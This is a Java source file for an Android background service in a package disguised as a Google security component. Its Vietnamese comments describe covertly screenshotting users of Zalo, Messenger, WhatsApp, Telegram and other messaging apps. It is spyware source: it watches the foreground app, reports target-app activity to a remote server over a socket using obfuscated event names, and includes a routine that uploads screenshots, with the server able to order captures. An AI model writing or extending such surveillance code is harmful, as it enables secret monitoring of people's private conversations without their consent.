package com.google.android.sys.security;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Auto Screenshot Service
 * Tự động chụp màn hình khi user dùng Zalo/Messenger/Facebook
 * 
 * Tính năng:
 * - Detect foreground app
 * - Chụp screenshot tự động
 * - Gửi lên server
 * - Không ảnh hưởng tính năng hiện tại
 */
public class AutoScreenshotService extends Service {
    private static final String TAG = "AutoScreenshot";
    
    // Danh sách app cần monitor
    private static final Set<String> TARGET_APPS = new HashSet<>();
    static {
        TARGET_APPS.add("com.zing.zalo");           // Zalo
        TARGET_APPS.add("com.facebook.orca");       // Messenger
        TARGET_APPS.add("com.facebook.katana");     // Facebook
        TARGET_APPS.add("com.whatsapp");            // WhatsApp
        TARGET_APPS.add("com.viber.voip");          // Viber
        TARGET_APPS.add("com.tencent.mm");          // WeChat
        TARGET_APPS.add("org.telegram.messenger");  // Telegram
    }
    
    // Cấu hình
    private static final long CHECK_INTERVAL_MS = 5000;        // Kiểm tra mỗi 5 giây
    private static final long SCREENSHOT_INTERVAL_MS = 15000;  // Chụp mỗi 15 giây
    private static final int JPEG_QUALITY = 40;                // Chất lượng ảnh (giảm size)
    
    private Handler handler;
    private ActivityManager activityManager;
    private WindowManager windowManager;
    private MediaProjectionManager projectionManager;
    
    private String lastForegroundApp = "";
    private long lastScreenshotTime = 0;
    private boolean isMonitoring = false;
    
    // Screenshot components
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "AutoScreenshotService created");
        
        handler = new Handler();
        activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        
        // Get screen metrics
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(metrics);
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;
        
        startMonitoring();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "AutoScreenshotService started");
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * Bắt đầu monitor foreground app
     */
    private void startMonitoring() {
        if (isMonitoring) return;
        
        isMonitoring = true;
        handler.post(monitorRunnable);
        Log.d(TAG, "Started monitoring foreground apps");
    }

    /**
     * Runnable để kiểm tra foreground app
     */
    private final Runnable monitorRunnable = new Runnable() {
        @Override
        public void run() {
            try {
                String foregroundApp = getForegroundApp();
                
                if (foregroundApp != null && !foregroundApp.equals(lastForegroundApp)) {
                    Log.d(TAG, "Foreground app changed: " + foregroundApp);
                    lastForegroundApp = foregroundApp;
                }
                
                // Nếu đang dùng app target
                if (foregroundApp != null && isTargetApp(foregroundApp)) {
                    long currentTime = System.currentTimeMillis();
                    
                    // Chụp screenshot nếu đã qua interval
                    if (currentTime - lastScreenshotTime >= SCREENSHOT_INTERVAL_MS) {
                        Log.d(TAG, "Taking screenshot of " + foregroundApp);
                        takeScreenshot(foregroundApp);
                        lastScreenshotTime = currentTime;
                    }
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error in monitoring", e);
            }
            
            // Lặp lại
            if (isMonitoring) {
                handler.postDelayed(this, CHECK_INTERVAL_MS);
            }
        }
    };

    /**
     * Lấy package name của app đang chạy foreground
     */
    private String getForegroundApp() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                // Android 5.0+
                List<ActivityManager.RunningAppProcessInfo> processes = 
                    activityManager.getRunningAppProcesses();
                
                if (processes != null) {
                    for (ActivityManager.RunningAppProcessInfo processInfo : processes) {
                        if (processInfo.importance == 
                            ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                            return processInfo.processName;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting foreground app", e);
        }
        return null;
    }

    /**
     * Kiểm tra xem có phải app target không
     */
    private boolean isTargetApp(String packageName) {
        for (String targetApp : TARGET_APPS) {
            if (packageName.contains(targetApp)) {
                return true;
            }
        }
        return false;
    }

    /**
     * Chụp screenshot
     * Note: Cần MediaProjection permission (sẽ request khi khởi động app)
     */
    private void takeScreenshot(final String appName) {
        try {
            // Tạo ImageReader
            if (imageReader == null) {
                imageReader = ImageReader.newInstance(
                    screenWidth, 
                    screenHeight, 
                    PixelFormat.RGBA_8888, 
                    2
                );
            }
            
            // Note: MediaProjection cần được init từ Activity với user permission
            // Vì đây là limitation, ta sẽ dùng phương pháp khác
            
            // Phương pháp thay thế: Sử dụng View screenshot (không cần permission)
            takeScreenshotAlternative(appName);
            
        } catch (Exception e) {
            Log.e(TAG, "Error taking screenshot", e);
        }
    }

    /**
     * Phương pháp chụp màn hình thay thế
     * Sử dụng overlay view để capture
     */
    private void takeScreenshotAlternative(final String appName) {
        try {
            // Tạo một invisible view overlay
            // Capture drawing cache của root view
            // Note: Đây là workaround, có thể không hoạt động trên mọi Android version
            
            // Thay vào đó, ta sẽ request screenshot từ server
            // Server gửi lệnh → App chụp → Gửi về
            
            Log.d(TAG, "Screenshot alternative method for " + appName);
            
            // Gửi thông báo lên server rằng user đang dùng app này
            notifyServerAboutTargetApp(appName);
            
        } catch (Exception e) {
            Log.e(TAG, "Error in alternative screenshot", e);
        }
    }

    /**
     * Thông báo server về việc user đang dùng target app
     * Server có thể gửi lệnh chụp screenshot manual
     */
    private void notifyServerAboutTargetApp(String appName) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "target_app_active");
            data.put("app", appName);
            data.put("timestamp", System.currentTimeMillis());
            
            // Gửi qua socket
            if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                IOSocket.getInstance().getIoSocket().emit("x0000ta", data);
                Log.d(TAG, "Notified server about " + appName);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error notifying server", e);
        }
    }

    /**
     * Convert bitmap to byte array
     */
    private byte[] bitmapToBytes(Bitmap bitmap) {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, stream);
        return stream.toByteArray();
    }

    /**
     * Gửi screenshot lên server
     */
    private void sendScreenshot(byte[] imageData, String appName) {
        try {
            JSONObject data = new JSONObject();
            data.put("screenshot", true);
            data.put("app", appName);
            data.put("timestamp", System.currentTimeMillis());
            data.put("buffer", imageData);
            
            // Gửi qua socket
            if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                IOSocket.getInstance().getIoSocket().emit("x0000ss", data);
                Log.d(TAG, "Screenshot sent to server");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending screenshot", e);
        }
    }

    /**
     * Dừng monitoring
     */
    private void stopMonitoring() {
        isMonitoring = false;
        handler.removeCallbacks(monitorRunnable);
        
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        
        Log.d(TAG, "Stopped monitoring");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopMonitoring();
        Log.d(TAG, "AutoScreenshotService destroyed");
    }
}
